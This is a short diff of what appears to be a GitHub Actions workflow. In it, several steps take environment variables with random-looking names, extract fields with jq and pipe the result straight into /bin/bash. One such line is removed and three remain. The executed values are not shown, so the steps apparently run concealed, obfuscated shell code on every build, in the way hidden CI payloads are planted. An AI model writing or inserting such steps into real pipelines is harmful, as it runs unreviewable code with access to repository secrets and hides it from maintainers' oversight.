@@ -20,7 +20,6 @@ jobs:
           echo $txfra580 | jq -r .spy60496 | /bin/bash
           echo $s24 | jq -r .diqxl08709 | /bin/bash
           echo $thdkd464 | jq -r .kh55205 | /bin/bash
-          echo $bde6001 | jq -r .wvs36581 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
